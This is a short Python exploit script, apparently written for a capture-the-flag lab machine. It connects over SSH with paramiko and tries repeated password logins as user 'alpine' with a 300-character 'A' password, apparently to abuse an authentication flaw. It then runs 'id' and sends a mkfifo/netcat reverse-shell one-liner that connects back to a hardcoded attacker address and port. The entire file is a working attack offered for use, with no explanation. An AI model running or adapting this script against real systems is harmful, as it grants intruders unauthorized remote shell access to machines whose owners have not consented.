 #!/usr/bin/env python3
import paramiko, sys, time

#host  = sys.argv[1]
#lhost = sys.argv[2]

lhost ="10.10.14.214"
host = "10.129.248.123"
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001

pw = "A" * 300
t  = paramiko.Transport((host, 22))
t.start_client(timeout=10)

for i in range(1, 7):
    try:
        t.auth_password("alpine", pw)
        print(f"[+] attempt {i}: authenticated")
        break
    except paramiko.AuthenticationException:
        print(f"[-] attempt {i}: denied")

if not t.is_authenticated():
    print("[-] failed"); sys.exit(1)

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command("id")

stdout = ch.makefile("r", -1).read()
stderr = ch.makefile_stderr("r", -1).read()
exit_code = ch.recv_exit_status()

print("[+] STDOUT:")
print(stdout)

print("[+] STDERR:")
print(stderr)

print(f"[+] Exit status: {exit_code}")
ch.exec_command(rev)
time.sleep(1)
t.close()
print("[+] sent")